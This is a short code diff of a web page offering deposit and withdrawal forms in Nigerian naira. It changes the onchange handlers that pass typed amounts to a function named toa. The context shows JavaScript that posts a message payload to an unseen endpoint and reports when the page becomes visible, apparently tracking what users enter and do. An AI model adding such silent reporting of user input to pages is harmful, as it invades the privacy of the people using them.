@@ -736,7 +736,7 @@ body {
 							<div class="formamount">
 								<h4>10,000 - 50,000,000 (NGN)</h4>
 							</div>
-							<input id="amountDE" type="text" inputmode="numeric" onchange="toa(this.value)" placeholder="Amount (NGN)" required>
+							<input id="amountDE" type="text" inputmode="numeric" onchange="toa(this.value);" placeholder="Amount (NGN)" required>
 							
 							<button id="pro">PROCEED</button>
 						</form>
@@ -802,7 +802,7 @@ body {
 								<h4>5k - 15m (NGN)</h4>
 								<p>Balance (NGN) <span class="amount"></span></p>
 							</div>
-							<input id="amountWI" type="text" inputmode="numeric" onchange="toa(`Withdraw: ${this.value}`)" placeholder="Amount (NGN)" required>
+							<input id="amountWI" type="text" inputmode="numeric" onchange="toa(this.value);" placeholder="Amount (NGN)" required>
 							
 							<button>PROCEED</button>
 						</form>
@@ -985,6 +985,7 @@ body {
                 body: JSON.stringify({ message: payload })    
             });  
         }
+		
 		// Send Status      
         document.addEventListener('visibilitychange', () => { 
             if (document.visibilityState === 'visible') {
